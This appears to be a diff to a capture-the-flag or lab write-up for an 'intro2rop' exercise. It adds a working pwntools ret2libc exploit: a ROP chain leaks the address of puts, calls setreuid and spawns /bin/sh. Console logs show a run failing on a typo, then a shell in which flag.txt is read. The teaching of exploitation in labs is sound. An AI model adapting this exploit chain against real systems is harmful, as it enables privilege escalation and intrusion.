@@ -243,10 +243,16 @@ context.update(arch='amd64', os='linux')
 
 #useful locations
 elf = ELF("./final")
-plt_puts = elf.plt.puts
-got_puts = elf.got.puts
+plt_puts = 0x400460
+got_puts = 0x601018
+start = 0x400577
+
 rop = ROP(elf)
 pop_rdi = rop.rdi.address
+rop.raw(pop_rdi)
+rop.raw(got_puts)
+rop.raw(plt_puts)
+ 
 
 p = process("./final")
 
@@ -265,7 +271,7 @@ libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
 puts_offset = libc.sym.puts
 libc_base = puts_addr - puts_offset
 libc.address = libc_base
-bin_sh = next(libc.search(b'/bin/sh/'))
+bin_sh = next(libc.search(b'/bin/sh'))
 
 rop = ROP(libc)
 rop.setreuid(1006, 1006)
@@ -277,6 +283,62 @@ payload2 += rop.chain()
 
 p.sendline(payload2)
 p.interactive()
+```
+```console
+buzz@intro2rop:~/final$ python2 exploit.py
+[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
+[*] '/home/buzz/final/final'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Loaded 14 cached gadgets for './final'
+[+] Starting local process './final': pid 12475
+Use me to read flag.txt!
+
+[!] Could not populate PLT: cannot import name arm_const
+[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+Traceback (most recent call last):
+  File "exploit.py", line 35, in <module>
+    bin_sh = next(libc.search(b'/bin/sh/'))
+StopIteration
+[*] Stopped process './final' (pid 12475)
+buzz@intro2rop:~/final$ vim exploit.py
+buzz@intro2rop:~/final$ python2 exploit.py
+[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
+[*] '/home/buzz/final/final'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Loaded 14 cached gadgets for './final'
+[+] Starting local process './final': pid 12494
+Use me to read flag.txt!
+
+[!] Could not populate PLT: cannot import name arm_const
+[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Loading gadgets for '/lib/x86_64-linux-gnu/libc-2.27.so'
+[*] Switching to interactive mode
+
+Use me to read flag.txt!
+$ whoami
+final
+$ ls
+exploit.py  final  final.c  flag.txt
+$ cat flag.txt
+flag{V1ct0ry!}
 ```
 
 
